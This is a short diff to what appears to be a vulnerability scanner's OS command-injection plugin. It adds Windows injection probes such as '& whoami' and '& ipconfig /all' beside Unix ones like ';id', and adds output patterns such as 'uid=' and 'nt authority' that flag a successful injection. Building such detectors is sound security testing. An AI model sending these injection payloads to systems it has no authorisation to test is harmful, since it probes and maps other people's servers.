@@ -34,6 +34,7 @@ logger = get_logger("plugins.oscommand")
 
 # 기본 페이로드 / 패턴 / 파라미터 후보
 DEFAULT_PAYLOADS: Sequence[str] = [
+    # Unix/Linux
     ";id",
     "&&id",
     "|id",
@@ -41,17 +42,31 @@ DEFAULT_PAYLOADS: Sequence[str] = [
     "|whoami",
     ";echo vulnerable",
     "|uname -a",
-    "&echo vulnerable",
+    # Windows
+    "& whoami",
+    "| whoami",
+    "& dir",
+    "& ipconfig /all",
+    "& echo vulnerable",
+    "&& echo vulnerable",
 ]
 
 DEFAULT_PATTERNS: Sequence[str] = [
+    # Unix/Linux
     r"uid=\d+",
     r"gid=\d+",
     r"root:.*:0:0:",
-    r"administrator",
-    r"vulnerable",
     r"linux",
     r"ubuntu",
+    # Windows
+    r"nt authority\\",
+    r"windows_nt",
+    r"volume in drive",
+    r"windows ip configuration",
+    r"subnet mask",
+    # Common
+    r"vulnerable",
+    r"administrator",
 ]
 
 COMMON_PARAMS: Sequence[str] = [
